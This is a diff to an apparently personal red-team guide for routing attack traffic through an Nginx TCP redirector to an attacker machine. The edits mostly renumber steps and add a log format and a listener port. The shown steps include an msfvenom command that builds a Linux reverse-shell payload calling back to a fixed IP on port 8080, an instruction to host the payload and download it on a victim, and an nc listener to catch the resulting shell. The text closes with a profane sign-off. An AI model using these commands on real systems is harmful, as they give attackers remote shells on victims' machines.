@@ -39,7 +39,7 @@
 
             proxy_pass <Parrot-IP>:80;
 
-            access_log /var/log/nginx/tcp_access.log;
+            access_log /var/log/nginx/tcp_access.log posh;
             error_log /var/log/nginx/tcp_error.log;
 
         }
@@ -47,18 +47,18 @@
 
     }
     ```
-5. Now lets reload Nginx with the new conf figles 
+6. Now lets reload Nginx with the new config files
     ```bash 
     sudo systemctl restart nginx.service
     ```
-6. From here we can now create a msfvenom shell or poshc2 with the correct ports set in the TCP section in the example we have `8080` 
+7. From here we can now create a msfvenom shell or poshc2 with the correct ports set in the TCP section in the example we have `8080` 
     ```bash
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.178.132 LPORT=8080 -a x64 -f elf > yup.elf
     ```
     > **NOTE:** Follow the same setup if you are using poshc2 for you bind port, probably 
-7. Host your payload however and download on victim 
-8. Now if you are running msfvenom start you `nc` listener to catch your beacon.
+8. Host your payload however and download on victim 
+9. Now if you are running msfvenom start you `nc` listener to catch your beacon.
     ```bash
-    sudo nc -lnvp
+    sudo nc -lnvp 80
     ```
-9.  tada you have a beacon shelley, fuck you.
+10. tada you have a beacon shelley, fuck you.
